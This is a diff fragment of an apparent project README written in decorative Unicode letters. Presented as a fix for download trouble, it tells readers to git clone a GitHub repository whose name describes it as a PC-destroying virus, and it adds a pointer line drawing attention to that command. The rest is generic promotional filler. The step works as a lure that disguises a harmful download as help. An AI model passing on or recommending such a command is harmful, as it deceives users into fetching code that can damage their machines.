@@ -8,6 +8,7 @@ Everyone has worked extremely hard on this project to bring you this unique expe
 𝕴𝖋 𝖞𝖔𝖚 𝖆𝖗𝖊 𝖍𝖆𝖛𝖎𝖓𝖌 𝖙𝖗𝖔𝖚𝖇𝖑𝖊 𝖉𝖔𝖜𝖓𝖑𝖔𝖆𝖉𝖎𝖓𝖌 𝖙𝖍𝖗𝖔𝖚𝖌𝖍 𝖙𝖍𝖊 𝖜𝖊𝖇𝖘𝖎𝖙𝖊, 𝖗𝖚𝖓 𝖙𝖍𝖎𝖘 𝖈𝖔𝖒𝖒𝖆𝖓𝖉:
 
 git clone https://github.com/paz343123/this_distroy_pc_virus.git
+👆:𝖙𝖍𝖎𝖘 𝖈𝖔𝖒𝖒𝖆𝖓𝖉
 
 ✨ User Experience
 𝕺𝖚𝖗 𝖕𝖗𝖎𝖒𝖆𝖗𝖿 𝖌𝖔𝖆𝖑 𝖜𝖆𝖘 𝖙𝖔 𝖈𝖗𝖊𝖆𝖙𝖊 𝖘𝖔𝖒𝖊𝖙𝖍𝖎𝖓𝖌 𝖒𝖊𝖒𝖔𝖗𝖆𝖇𝖑𝖊. 𝖂𝖊 𝖍𝖔𝖕𝖊 𝖞𝖔𝖚 𝖊𝖓𝏏𝖔𝖞 𝖊𝖝𝖕𝖑𝖔𝖗𝖎𝖓𝖌 𝖙𝖍𝖊 𝖕𝖗𝖔𝖏𝖊𝖈𝖙 𝖆𝖘 𝖒𝖚𝖈𝖍 𝖆𝖘 𝖜𝖊 𝖊𝖓𝏏𝖔𝖞𝖊𝖉 𝖇𝖚𝖎𝖑𝖉𝖎𝖓𝖌 𝖎𝖙.
